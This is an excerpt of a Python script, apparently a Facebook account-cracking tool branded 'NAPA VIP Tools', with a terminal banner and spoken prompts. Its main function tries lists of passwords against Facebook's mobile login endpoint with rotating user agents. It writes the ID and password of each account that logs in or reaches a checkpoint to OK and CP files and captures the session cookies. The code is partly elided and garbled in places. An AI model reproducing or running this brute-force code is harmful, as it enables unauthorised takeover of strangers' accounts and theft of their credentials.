...
╠══[Facebook                 • Emon khaLîfa       ║  \033[1;97m  
╠══[Github                   • \33[1;38marohi999 ║\33[1;34m   
╠══[Whatsapp                 • 018*********    ║\33[1;35m 
╠══[TOOLS             33[0;41m   • PAID ] \033[0;92m   
...
def naima():
	print('-------------------')
print(logo)
os.system('espeak -a 300 " ENTAR,   YOUR ,  GIRLFRIEND , NAME"')
uname =input('\033[1;91m[\033[1;92m√\033[1;91m] \x1b[38;5;50mENTER YOUR NAME \033[1;91m: \33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  NAPA,  V I P,  Tools"')
def back():
	login()
...
def passwrd():
    os.system('clear')
    print(logo)
    print(f"\x1b[1;93m\x1b[1;93m====>\x1b[1;93m] \x1b[1;93m[1; 97mTOOLS RANAR GF NAME \x1b[1;93m :\x1b[1;93m "+𝚞𝚗𝚊𝚖𝚎)
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print('\x1b[38;5;50m===============================================')
                os.system('espeak -a 300 " NAPAEXTRA,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[NAPA-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mNAPA-CP\033[1;91m] {idf} • {pw}')
                print('\x1b[38;5;50m============================')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•NAPA-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
                print('\x1b[38;5;50m===============================================')
                os.system('espeak -a 300 " NAPA EXTRA,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
